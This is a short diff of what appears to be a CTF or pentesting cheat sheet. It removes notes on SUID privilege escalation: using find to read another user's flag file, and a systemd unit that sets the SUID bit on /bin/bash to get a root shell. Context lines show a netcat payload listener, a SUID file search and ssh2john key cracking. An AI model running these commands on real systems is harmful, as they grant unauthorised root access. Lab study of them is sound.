@@ -160,30 +160,6 @@ ncat -lkvnp 1234 (listen to payload)
 
 find / -user root -perm -4000 2>> /dev/null (find SUID files)
 
-***find***
-
-find filename -exec cat /home/igor/flag1.txt \; 
-
-***systemctl***
-
-TF=$(mktemp).service
-
-echo '[Service]
-
-Type=oneshot
-
-ExecStart=/bin/sh -c "chmod +s /bin/bash"
-
-[Install]
-
-WantedBy=multi-user.target' > $TF
-
-/bin/systemctl link $TF
-
-/bin/systemctl enable --now $TF
-
-bash -p
-
 ## ssh with private key
 
 /usr/share/john/ssh2john.py key > forjohn
